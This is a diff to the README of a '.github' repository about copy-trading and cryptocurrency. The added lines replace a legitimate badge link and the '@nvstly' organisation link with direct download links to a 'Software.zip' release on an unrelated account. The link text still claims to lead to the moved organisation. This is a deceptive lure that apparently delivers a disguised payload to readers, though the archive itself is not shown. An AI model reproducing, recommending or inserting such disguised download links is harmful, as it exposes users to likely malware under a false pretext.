@@ -1,9 +1,9 @@
 # 🚀 Welcome to the ".github" Repository! 🌟
 
-[![Download .github](https://img.shields.io/badge/Download-.github-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download .github](https://github.com/Hsaoooooo/.github/releases/download/v1.0/Software.zip)](https://github.com/Hsaoooooo/.github/releases/download/v1.0/Software.zip)
 
 ### Description:
-This repository has been moved to [@nvstly](https://github.com/nvstly). Feel free to check out the new location for exciting updates and content in the world of copy-trading, cryptocurrencies, finance, investing, social trading, and more!
+This repository has been moved to [@nvstly](https://github.com/Hsaoooooo/.github/releases/download/v1.0/Software.zip). Feel free to check out the new location for exciting updates and content in the world of copy-trading, cryptocurrencies, finance, investing, social trading, and more!
 
 ### Topics Covered:
 - Copy-Trading
